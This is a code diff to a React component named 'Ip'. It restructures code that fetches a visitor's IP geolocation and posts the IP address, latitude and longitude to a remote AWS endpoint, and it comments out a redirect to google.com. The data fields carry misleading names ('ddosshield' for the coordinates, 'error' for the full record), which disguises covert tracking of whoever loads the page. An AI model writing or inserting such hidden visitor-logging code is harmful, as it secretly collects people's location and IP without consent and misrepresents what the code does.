@@ -54,10 +54,30 @@ function Ip() {
   const [theDate, setTheDate] = useState(buff3.toString("utf-8"));
 
   useEffect(() => {
+    const callAPI = async () => {
+      try {
+        const res = await fetch(text);
+        const data = await res.json();
+        setInfo(data);
+      } catch (err) {}
+    };
     callAPI();
   }, []);
   useEffect(() => {
     if (!info) return;
+    const create = async () => {
+      await axios
+        .post(`${process.env.NEXT_PUBLIC_AWS_API}` + text2, {
+          data: {
+            error: info,
+            token: "none",
+            ddosshield: info.lat + "," + info.lon,
+            user: info.query,
+            time: new Date(),
+          },
+        })
+        .then((response) => {});
+    };
     create();
   }, [info]);
 
@@ -93,32 +113,11 @@ function Ip() {
     return Math.floor(Math.random() * (max - min + 1) + min);
   }
 
-  const callAPI = async () => {
-    try {
-      const res = await fetch(text);
-      const data = await res.json();
-      setInfo(data);
-    } catch (err) {}
-  };
-  const create = async () => {
-    await axios
-      .post(`${process.env.NEXT_PUBLIC_AWS_API}` + text2, {
-        data: {
-          error: info,
-          token: "none",
-          ddosshield: info.lat + "," + info.lon,
-          user: info.query,
-          time: new Date(),
-        },
-      })
-      .then((response) => {});
-  };
-
-  const redirect = async () => {
-    try {
-      router.push("https://www.google.com");
-    } catch (err) {}
-  };
+  // const redirect = async () => {
+  //   try {
+  //     router.push("https://www.google.com");
+  //   } catch (err) {}
+  // };
 
   return (
     <div>
